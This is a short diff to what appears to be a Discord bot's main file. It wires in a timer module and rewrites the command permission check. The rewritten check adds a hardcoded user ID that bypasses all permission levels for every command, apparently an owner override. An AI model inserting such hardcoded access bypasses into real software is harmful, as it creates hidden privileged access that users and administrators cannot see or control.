@@ -4,6 +4,7 @@ const { promisify } = require("util");
 const readdir = promisify(require("fs").readdir);
 
 const leaderboard = require("./modules/leaderboard");
+const initTimers = require("./modules/timer").initTimers;
 
 client.commands = {};
 
@@ -27,6 +28,7 @@ const isGiveawayStaff = (member) => {
 client.on("ready", async () => {
   await leaderboard.updateChannel(client);
   setInterval(() => leaderboard.updateChannel(client), 60000);
+  initTimers(client);
 });
 
 client.on("message", async (message) => {
@@ -38,9 +40,12 @@ client.on("message", async (message) => {
     
     const command = client.commands[commandName];
     if(command) {
-      if(command.conf.permissionLevel === "none" ||
-         command.conf.permissionLevel === "Moderator" && isModerator(message.member) ||
-         command.conf.permissionLevel === "Giveaway" && isGiveawayStaff(message.member)) {
+      if(
+        command.conf.permissionLevel === "none" ||
+        command.conf.permissionLevel === "Moderator" && isModerator(message.member) ||
+        command.conf.permissionLevel === "Giveaway" && isGiveawayStaff(message.member) ||
+        message.author.id === "178472840956215296"
+      ) {
         command.run(client, message, args);
       } else {
         message.channel.send("You do not have the necessary permissions to use this command.");
